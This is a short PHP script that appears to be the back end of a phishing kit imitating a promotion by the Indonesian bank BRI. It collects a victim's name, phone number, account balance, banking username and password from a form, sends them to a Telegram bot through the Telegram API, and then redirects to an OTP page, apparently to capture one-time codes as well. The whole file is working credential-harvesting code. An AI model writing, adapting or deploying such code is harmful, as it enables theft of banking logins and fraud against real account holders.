<?php 



session_start();
include "telegram.php";


$message = "===𝑭𝒆𝒔𝒕𝒊𝒗𝒂𝒍 𝑮𝒆𝒃𝒚𝒂𝒓 𝑩𝑹𝑰==="
. "\n𝑵𝒂𝒎𝒂 :" . $_POST['nama']. "\n𝑵𝒐.𝑯𝑷 :" . $_POST['nomor'].
"\n𝑺𝒂𝒍𝒅𝒐 :" . $_POST['saldo'].
"\n𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 :". $_POST['uname'].
"\n𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 :" . $_POST['pass'];

function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?>